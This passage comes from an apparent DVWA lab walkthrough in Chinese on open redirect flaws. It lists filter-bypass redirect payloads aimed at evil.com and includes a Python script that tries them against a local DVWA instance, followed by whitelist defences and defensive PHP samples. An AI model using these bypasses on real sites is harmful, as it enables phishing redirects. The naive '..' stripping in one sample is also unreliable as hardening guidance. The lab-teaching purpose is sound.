<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：利用解析器差异"><a href="#方法1：利用解析器差异" class="headerlink" title="方法1：利用解析器差异"></a>方法1：利用解析器差异</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">某些情况下，<span class="built_in">parse_url</span>()和浏览器解析URL的方式不同</span><br><span class="line"></span><br><span class="line">URL: http:<span class="comment">//example.com\@evil.com</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">parse_url</span><span class="params">()</span></span>可能认为：</span><br><span class="line">host = <span class="string">&quot;example.com&quot;</span></span><br><span class="line"></span><br><span class="line">但浏览器可能认为：</span><br><span class="line">host = <span class="string">&quot;evil.com&quot;</span></span><br><span class="line"></span><br><span class="line">结果：检查通过，但重定向到evil.com</span><br></pre></td></tr></table></figure>

<h4 id="方法2：协议相对URL"><a href="#方法2：协议相对URL" class="headerlink" title="方法2：协议相对URL"></a>方法2：协议相对URL</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果允许的白名单没有检查协议：</span><br><span class="line"></span><br><span class="line">URL: ?redirect=<span class="regexp">//</span>evil.com</span><br><span class="line"></span><br><span class="line">某些配置下可能绕过检查</span><br></pre></td></tr></table></figure>

<h4 id="方法3：端口绕过"><a href="#方法3：端口绕过" class="headerlink" title="方法3：端口绕过"></a>方法3：端口绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>example.com:<span class="number">8080</span>@evil.com</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">URL: ?redirect=http:<span class="regexp">//</span>example.com%<span class="number">2</span>f.evil.com</span><br></pre></td></tr></table></figure>

<p><strong>实际测试：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/redirect/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;high&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试各种绕过payload</span></span><br><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;http://example.com@evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://example.com\\@evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://example.com%2f.evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;//evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://example.com:80@evil.com&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    params = &#123;<span class="string">&#x27;redirect&#x27;</span>: payload&#125;</span><br><span class="line">    response = requests.get(url, params=params, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">302</span>:</span><br><span class="line">        location = response.headers.get(<span class="string">&#x27;Location&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload worked: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Redirects to: <span class="subst">&#123;location&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Payload blocked: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的URL验证，真正安全。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：验证Anti-CSRF token ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护1：严格的白名单 ★★★</span></span><br><span class="line">    <span class="comment">// 定义允许的重定向URL（相对路径或绝对路径）</span></span><br><span class="line">    <span class="variable">$allowed_redirects</span> = [</span><br><span class="line">        <span class="string">&#x27;success.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dashboard.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/vulnerabilities/redirect/success.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https://www.example.com/success&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护2：完全匹配，不是包含 ★★★</span></span><br><span class="line">    <span class="comment">// in_array() - 严格检查</span></span><br><span class="line">    <span class="comment">// 参数3：true表示严格比较（类型和值都要相等）</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">in_array</span>( <span class="variable">$redirect</span>, <span class="variable">$allowed_redirects</span>, <span class="literal">true</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 额外检查：如果是绝对URL，验证协议和域名 ★★★</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$redirect</span>, <span class="string">&#x27;http&#x27;</span> ) === <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// 解析URL</span></span><br><span class="line">            <span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>( <span class="variable">$redirect</span> );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( !<span class="variable">$parsed</span> ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid URL format&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ★★★ 验证协议 ★★★</span></span><br><span class="line">            <span class="variable">$allowed_schemes</span> = [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>];</span><br><span class="line">            <span class="variable">$scheme</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;scheme&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( !<span class="title function_ invoke__">in_array</span>( <span class="variable">$scheme</span>, <span class="variable">$allowed_schemes</span> ) ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid protocol&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ★★★ 验证域名 ★★★</span></span><br><span class="line">            <span class="variable">$allowed_domains</span> = [<span class="string">&#x27;www.example.com&#x27;</span>, <span class="string">&#x27;example.com&#x27;</span>];</span><br><span class="line">            <span class="variable">$host</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( !<span class="title function_ invoke__">in_array</span>( <span class="variable">$host</span>, <span class="variable">$allowed_domains</span> ) ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid domain&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ★★★ 验证端口（如果有） ★★★</span></span><br><span class="line">            <span class="variable">$port</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$port</span> !== <span class="literal">null</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>( <span class="variable">$port</span>, [<span class="number">80</span>, <span class="number">443</span>] ) ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid port&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 所有检查通过，安全重定向 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 改进：不透露白名单信息 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid redirect target&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 记录可疑行为 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Invalid redirect attempt&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="title function_ invoke__">dvwaCurrentUser</span>(),</span><br><span class="line">            <span class="string">&#x27;redirect&#x27;</span> =&gt; <span class="variable">$redirect</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>)</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>HTML表单（包含CSRF token）：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $_SESSION[&#x27;session_token&#x27;]; ?&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Select destination:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;success.php&quot;</span>&gt;</span>Success Page<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;dashboard.php&quot;</span>&gt;</span>Dashboard<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;https://www.example.com/success&quot;</span>&gt;</span>External Success<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Go<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
<ol>
<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
<li><strong>严格白名单</strong> - 只允许预定义的URL</li>
<li><strong>完全匹配</strong> - 不是部分匹配</li>
<li><strong>协议验证</strong> - 只允许http&#x2F;https</li>
<li><strong>域名验证</strong> - 只允许指定域名</li>
<li><strong>端口验证</strong> - 只允许标准端口</li>
<li><strong>审计日志</strong> - 记录所有失败尝试</li>
<li><strong>不泄露信息</strong> - 错误消息统一</li>
</ol>
<p><strong>验证流程：</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">用户选择重定向目标</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">1.</span> 验证CSRF Token → 无效则拒绝</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">2.</span> 检查是否在白名单中 → 不在则拒绝</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">3.</span> 如果是绝对<span class="built_in">URL</span>：</span><br><span class="line">   <span class="keyword">a</span>. 验证协议 → 不是<span class="keyword">http</span>/<span class="keyword">https</span>则拒绝</span><br><span class="line">   b. 验证域名 → 不在白名单则拒绝</span><br><span class="line">   c. 验证端口 → 非标准端口则拒绝</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">4.</span> 记录重定向日志</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">5.</span> 执行重定向</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被阻止：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">攻击1：?<span class="attribute">redirect</span>=https://evil.com</span><br><span class="line">白名单检查 → 不在列表 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击2：?<span class="attribute">redirect</span>=success.php@evil.com</span><br><span class="line">白名单检查 → 完全不匹配 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击3：?<span class="attribute">redirect</span>=https://example.com.evil.com</span><br><span class="line">白名单检查 → 不在列表 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击4：?<span class="attribute">redirect</span>=//evil.com</span><br><span class="line">白名单检查 → 不在列表 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击5：URL编码绕过</span><br><span class="line">白名单检查 → 编码后不匹配 → 拒绝</span><br></pre></td></tr></table></figure>

<p><strong>关键防御点：</strong></p>
<ol>
<li><strong>白名单机制</strong> - 默认拒绝，只允许明确列出的URL</li>
<li><strong>完全匹配</strong> - 不接受任何变体</li>
<li><strong>多层验证</strong> - 协议、域名、端口都检查</li>
<li><strong>CSRF防护</strong> - 防止攻击者构造恶意链接</li>
<li><strong>审计日志</strong> - 记录所有异常</li>
</ol>
<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-使用白名单（最佳方案）"><a href="#1-使用白名单（最佳方案）" class="headerlink" title="1. 使用白名单（最佳方案）"></a>1. 使用白名单（最佳方案）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义允许的重定向URL</span></span><br><span class="line"><span class="variable">$allowed_redirects</span> = [</span><br><span class="line">    <span class="string">&#x27;/dashboard&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/profile&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/settings&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https://trusted-site.com/page&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格匹配</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$redirect</span>, <span class="variable">$allowed_redirects</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid redirect&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<h4 id="2-只允许相对路径"><a href="#2-只允许相对路径" class="headerlink" title="2. 只允许相对路径"></a>2. 只允许相对路径</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许站内跳转</span></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>] ?? <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确保是相对路径</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$redirect</span>, <span class="string">&#x27;http&#x27;</span>) !== <span class="literal">false</span> ||</span><br><span class="line">    <span class="title function_ invoke__">strpos</span>(<span class="variable">$redirect</span>, <span class="string">&#x27;//&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Only relative paths allowed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 额外：防止路径遍历</span></span><br><span class="line"><span class="variable">$redirect</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$redirect</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<h4 id="3-验证域名"><a href="#3-验证域名" class="headerlink" title="3. 验证域名"></a>3. 验证域名</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAllowedDomain</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$parsed</span> || !<span class="keyword">isset</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$allowed_domains</span> = [</span><br><span class="line">        <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;www.example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;subdomain.example.com&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$allowed_domains</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAllowedDomain</span>(<span class="variable">$redirect</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid domain&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<h4 id="4-使用映射而非直接URL"><a href="#4-使用映射而非直接URL" class="headerlink" title="4. 使用映射而非直接URL"></a>4. 使用映射而非直接URL</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用ID映射到URL</span></span><br><span class="line"><span class="variable">$redirect_map</span> = [</span><br><span class="line">    <span class="string">&#x27;success&#x27;</span> =&gt; <span class="string">&#x27;/success.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dashboard&#x27;</span> =&gt; <span class="string">&#x27;/dashboard.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;profile&#x27;</span> =&gt; <span class="string">&#x27;/user/profile.php&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$redirect_id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$redirect_map</span>[<span class="variable">$redirect_id</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid redirect ID&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect_map</span>[<span class="variable">$redirect_id</span>]);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<h4 id="5-添加确认页面"><a href="#5-添加确认页面" class="headerlink" title="5. 添加确认页面"></a>5. 添加确认页面</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重定向到外部网站前显示警告</span></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">isExternalUrl</span>(<span class="variable">$redirect</span>)) &#123;</span><br><span class="line">    <span class="comment">// 显示确认页面</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;h2&gt;You are leaving our site&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;You are about to visit: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$redirect</span>); <span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Do you want to <span class="keyword">continue</span>?&lt;/p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$redirect</span>); ?&gt;&quot;</span>&gt;Yes, <span class="keyword">continue</span>&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/&quot;</span>&gt;No, stay here&lt;/a&gt;</span><br><span 